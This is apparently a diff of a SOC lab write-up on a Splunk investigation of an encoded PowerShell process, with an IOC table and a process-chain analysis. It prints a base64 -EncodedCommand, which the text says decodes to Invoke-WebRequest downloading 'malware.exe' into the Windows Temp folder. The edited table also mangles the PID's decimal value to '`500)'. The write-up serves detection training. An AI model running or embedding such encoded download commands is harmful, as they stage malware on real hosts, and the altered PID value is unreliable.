@@ -38,16 +38,15 @@ The Splunk query identified a PowerShell process executed by the `Administrator`
 **Key Findings**   
 | IOC / Observable | Value | Description |
 |---|---|---|
-| **Timestamp** | `2026-09-06 12:39:43.372` | Time of suspicious process execution |
-| **Host** | `WKSTN-041` | Affected workstation |
-| **Account** | `Administrator` | Account that executed the process |
-| **Process ID** | `0x5dc` (Decimal: `1500`) | PID of the suspicious PowerShell process |
-| **Process Name** | `powershell.exe` | Windows PowerShell executable |
-| **Process Path** | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` | Path of the PowerShell executable |
-| **Creator Process ID** | `0xf08` (Decimal: `3848`) | PID of the parent/creator process |
-| **Creator Process Name** | `powershell.exe` | Parent process |
-| **Process_Command_Line** |  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBzAC0AYQBuAGoAZQBlAHYALwBzAG8AYwAtAHAAcgBvAGoAZQBjAHQAcwAvAGIAbABvAGIALwBtAGEAaQBuAC8AMAAzAC0ATQBhAGwAdwBhAHIAZQAtAEEAbgBhAGwAeQBzAGkAcwAvAGMAYQBzAGUALQAwADEALQBwAG8AdwBlAHIAcwBoAGUAbABsAC0AZAByAG8AcABwAGUAcgAvAHMAYQBtAHAAbABlAC8AbQBhAGwAdwBhAHIAZQAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAbQBhAGwAdwBhAHIAZQAuAGUAeABlACIA
-|  Encoded Command Execution |     
+| **Timestamp** | 2026-09-06 12:39:43.372 | Time of suspicious process execution |
+| **Host** | WKSTN-041 | Affected workstation |
+| **Account** | Administrator | Account that executed the process |
+| **Process ID** | 0x5dc (Decimal: `500) | PID of the suspicious PowerShell process |
+| **Process Name** | powershell.exe | Windows PowerShell executable |
+| **Process Path** | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` | Path of the PowerShell executable |
+| **Creator Process ID** | 0xf08 (Decimal: 3848) | PID of the parent/creator process |
+| **Creator Process Name** | powershell.exe | Parent process |
+| **Process_Command_Line** |  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBzAC0AYQBuAGoAZQBlAHYALwBzAG8AYwAtAHAAcgBvAGoAZQBjAHQAcwAvAGIAbABvAGIALwBtAGEAaQBuAC8AMAAzAC0ATQBhAGwAdwBhAHIAZQAtAEEAbgBhAGwAeQBzAGkAcwAvAGMAYQBzAGUALQAwADEALQBwAG8AdwBlAHIAcwBoAGUAbABsAC0AZAByAG8AcABwAGUAcgAvAHMAYQBtAHAAbABlAC8AbQBhAGwAdwBhAHIAZQAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAbQBhAGwAdwBhAHIAZQAuAGUAeABlACIA     
 
 ## Decode Command
 **Lets Decode Executed Command Using cyberchef.io**    
@@ -69,20 +68,6 @@ Actual Command executed was `Invoke-WebRequest -Uri "https://github.com/s-anjeev
 
 ## Process Tree Analysis  
 With the parent and child process IDs identified, we can now trace the execution chain to understand how the suspicious PowerShell activity originated.   
-The investigation revealed the following execution chain:
-
-explorer.exe  
-PID: 0x1164  
-    │  
-    └── WindowsTerminal.exe    
-        PID: 0xba0   
-            │   
-            └── powershell.exe   
-                PID: 0xf08  
-                    │  
-                    └── powershell.exe  
-                        PID: 0x5dc  
-                        └── Encoded PowerShell Command     
 
 The process creation events were correlated using the `Creator Process ID` and `New Process ID` fields. The timestamps show the following execution sequence:  
 
@@ -91,4 +76,6 @@ The process creation events were correlated using the `Creator Process ID` and `
 | `12:39:24.721` | `explorer.exe` | `0x1164` | `WindowsTerminal.exe` | `0xba0` |
 | `12:39:27.462` | `WindowsTerminal.exe` | `0xba0` | `powershell.exe` | `0xf08` |
 | `12:39:43.372` | `powershell.exe` | `0xf08` | `powershell.exe` | `0x5dc` |   
+
+
 
